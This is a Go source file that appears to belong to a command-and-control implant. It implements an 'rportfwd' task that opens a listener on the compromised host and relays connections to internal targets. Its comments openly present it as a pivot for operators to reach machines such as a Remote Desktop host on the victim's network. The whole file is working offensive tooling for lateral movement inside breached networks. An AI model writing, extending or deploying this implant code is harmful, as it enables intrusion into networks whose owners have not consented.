//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
)

// ── Agent-side reverse port forward listener ─────────────────────────────────
// The `rportfwd` task ("<lport>|<targetHost:targetPort>") binds a TCP listener
// on the agent and bridges every accepted connection directly to the target.
// This is a genuine pivot listener for reaching hosts on the agent's network
// (e.g. `rportfwd 2222|10.0.0.5:3389` => connecting to <agent>:2222 reaches
// 10.0.0.5:3389). Traffic flows agent<->target locally; no C2 channel round
// trip, so operators get a fast, honest forwarder instead of a stub message.

var (
	rpfMu        sync.Mutex
	rpfListeners = map[int]*rpfListener{}
)

type rpfListener struct {
	lport  int
	target string
	ln     net.Listener
	closed bool
	conns  map[uint64]net.Conn
	wg     sync.WaitGroup
}

func rpfNextConnID() uint64 {
	var b [8]byte
	_, _ = rand.Read(b[:])
	return binary.BigEndian.Uint64(b[:])
}

// startRPortForward binds lport on all interfaces and starts bridging accepted
// connections to target. Returns the actual bind address on success.
func startRPortForward(lport int, target string) (string, error) {
	if lport < 1 || lport > 65535 {
		return "", fmt.Errorf("invalid listener port: %d", lport)
	}
	host, portStr, err := net.SplitHostPort(target)
	if err != nil || host == "" {
		return "", fmt.Errorf("invalid target %q: want host:port", target)
	}
	if _, err := strconv.Atoi(portStr); err != nil {
		return "", fmt.Errorf("invalid target port in %q", target)
	}

	rpfMu.Lock()
	if existing, ok := rpfListeners[lport]; ok && !existing.closed {
		rpfMu.Unlock()
		return "", fmt.Errorf("rportfwd already listening on :%d", lport)
	}
	rpfMu.Unlock()

	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", lport))
	if err != nil {
		return "", err
	}

	h := &rpfListener{
		lport:  lport,
		target: target,
		ln:     ln,
		conns:  make(map[uint64]net.Conn),
	}
	rpfMu.Lock()
	rpfListeners[lport] = h
	rpfMu.Unlock()

	h.wg.Add(1)
	go h.acceptLoop()
	return ln.Addr().String(), nil
}

func (h *rpfListener) acceptLoop() {
	defer h.wg.Done()
	for {
		conn, err := h.ln.Accept()
		if err != nil {
			h.closeAll()
			return
		}
		h.wg.Add(1)
		go h.bridge(conn)
	}
}

// bridge pipes one accepted connection to the target and back.
func (h *rpfListener) bridge(in net.Conn) {
	defer h.wg.Done()
	cid := rpfNextConnID()
	h.rpfMuLock()
	h.conns[cid] = in
	h.rpfMuUnlock()
	defer func() {
		h.rpfMuLock()
		delete(h.conns, cid)
		h.rpfMuUnlock()
		in.Close()
	}()

	out, err := net.DialTimeout("tcp", h.target, 10*time.Second)
	if err != nil {
		return
	}
	defer out.Close()

	done := make(chan struct{}, 2)
	copyDir := func(dst, src net.Conn) {
		_, _ = io.Copy(dst, src)
		done <- struct{}{}
	}
	go copyDir(out, in)
	go copyDir(in, out)
	<-done
}

func (h *rpfListener) stop() {
	h.rpfMuLock()
	if h.closed {
		h.rpfMuUnlock()
		return
	}
	h.closed = true
	for _, c := range h.conns {
		_ = c.Close()
	}
	h.rpfMuUnlock()
	_ = h.ln.Close()
}

// stopRPortForward closes the agent-side listener and all active bridges.
func stopRPortForward(lport int) (int, error) {
	rpfMu.Lock()
	h, ok := rpfListeners[lport]
	if ok {
		delete(rpfListeners, lport)
	}
	rpfMu.Unlock()
	if !ok {
		return 0, fmt.Errorf("no rportfwd active on :%d", lport)
	}
	h.stop()
	return len(h.conns), nil
}

func (h *rpfListener) closeAll() {
	h.rpfMuLock()
	h.closed = true
	for _, c := range h.conns {
		_ = c.Close()
	}
	h.rpfMuUnlock()
}

func (h *rpfListener) rpfMuLock()   { rpfMu.Lock() }
func (h *rpfListener) rpfMuUnlock() { rpfMu.Unlock() }